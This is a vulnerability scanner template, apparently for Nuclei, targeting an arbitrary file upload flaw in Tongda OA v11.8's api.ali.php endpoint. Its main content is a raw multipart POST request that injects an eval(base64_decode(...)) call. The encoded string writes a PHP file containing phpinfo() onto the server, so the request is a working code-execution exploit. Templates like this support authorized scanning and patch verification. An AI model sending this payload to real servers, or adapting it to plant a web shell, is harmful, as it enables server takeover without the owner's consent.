id: tongdaOA-v11_8-api-ali-file-upload

info:
  name: 通达OA v11.8 api.ali.php 任意文件上传漏洞
  author: cnaq
  severity: high
  description: 通达OA v11.8 api.ali.php 存在任意文件上传漏洞，攻击者通过漏可以上传恶意文件控制服务器
  reference:
    - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20api.ali.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
  tags: tongdaOA,api,file,upload
  
requests:
  - raw:
      - |
        POST /mobile/api/api.ali.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae
        Accept-Encoding: gzip

        --502f67681799b07e4de6b503655f5cae
        Content-Disposition: form-data; name="file"; filename="fb6790f4.json"
        Content-Type: application/octet-stream

        {"modular":"AllVariable","a":"ZmlsZV9wdXRfY29udGVudHMoJy4uLy4uL2ZiNjc5MGY0LnBocCcsJzw/cGhwIHBocGluZm8oKTs/PicpOw==","dataAnalysis":"{\"a\":\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\"}"}
        --502f67681799b07e4de6b503655f5cae--

    matchers:
      - type: status
        status:
          - 200
      
      - type: dsl
        dsl:
          - 'len(body)==0'